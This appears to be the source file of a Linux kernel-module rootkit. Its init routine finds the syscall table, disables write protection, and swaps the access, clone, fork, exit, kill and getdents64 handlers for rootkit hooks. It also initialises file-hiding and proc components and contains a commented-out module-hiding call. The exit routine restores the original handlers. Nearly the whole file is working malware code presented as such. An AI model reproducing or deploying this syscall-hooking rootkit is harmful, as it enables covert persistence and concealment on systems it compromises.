#include "main.h"

static unsigned long *syscall_table;

sys_call_stub orig_access;
asmlinkage long (*orig_clone)(unsigned long, unsigned long, int __user *, unsigned long, int __user *);
asmlinkage long (*orig_fork)(void);
asmlinkage long (*orig_exit)(int);
sys_call_stub orig_kill;
sys_call_stub orig_getdents64;

static int __init lkm_rootkit_init(void)
{
    printk(KERN_INFO "Hello, World!\n");

    if (proc_init() || hidefs_init())
    {
        proc_clean();
        hidefs_clean();
        return -1;
    }

    // module_hide();

    syscall_table = find_syscall_table();
    pr_info("Found syscall_table at %lx\n", *syscall_table);

    orig_access = (sys_call_stub)syscall_table[__NR_access];
    orig_clone = (asmlinkage long (*)(unsigned long, unsigned long, int __user *, unsigned long, int __user *_))syscall_table[__NR_clone];
    orig_fork = (asmlinkage long (*)(void))syscall_table[__NR_fork];
    orig_exit = (asmlinkage long (*)(int))syscall_table[__NR_exit];
    orig_kill = (sys_call_stub)syscall_table[__NR_kill];
    orig_getdents64 = (sys_call_stub)syscall_table[__NR_getdents64];

    disable_write_protect();

    syscall_table[__NR_access] = (unsigned long)rk_access;
    syscall_table[__NR_clone] = (unsigned long)rk_clone;
    syscall_table[__NR_fork] = (unsigned long)rk_fork;
    syscall_table[__NR_exit] = (unsigned long)rk_exit;
    syscall_table[__NR_kill] = (unsigned long)rk_kill;
    syscall_table[__NR_getdents64] = (unsigned long)rk_getdents64;
    enable_write_protect();

    return 0;
}

static void __exit lmk_rootkit_exit(void)
{
    proc_clean();
    hidefs_clean();

    disable_write_protect();

    syscall_table[__NR_access] = (unsigned long)orig_access;
    syscall_table[__NR_clone] = (unsigned long)orig_clone;
    syscall_table[__NR_fork] = (unsigned long)orig_fork;
    syscall_table[__NR_exit] = (unsigned long)orig_exit;
    syscall_table[__NR_kill] = (unsigned long)orig_kill;
    syscall_table[__NR_getdents64] = (unsigned long)orig_getdents64;

    enable_write_protect();

    printk(KERN_INFO "Goodbye, World!\n");
}
